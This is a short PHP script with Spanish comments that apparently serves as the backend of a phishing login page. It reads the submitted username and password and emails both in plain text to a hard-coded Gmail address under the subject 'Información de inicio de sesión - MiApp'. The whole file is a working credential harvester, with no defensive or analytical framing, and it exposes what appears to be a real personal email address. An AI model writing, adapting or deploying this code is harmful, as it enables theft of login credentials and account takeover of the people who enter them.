<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Destinatario
    $destinatario = 'josueramon014@gmail.com';

    // Asunto
    $asunto = 'Información de inicio de sesión - MiApp';

    // Mensaje
    $mensaje = "Nombre de usuario o correo electrónico: $username \nContraseña: $password";

    // Cabeceras
    $cabeceras = 'From: tu_direccion_de_email@example.com' . "\r\n" .
        'Reply-To: tu_direccion_de_email@example.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();

    // Envío del correo
    $mail_enviado = mail($destinatario, $asunto, $mensaje, $cabeceras);

    // Verificación del envío
    if ($mail_enviado) {
        echo 'El correo se ha enviado correctamente';
    } else {
        echo 'Hubo un error al enviar el correo';
    }
}
?>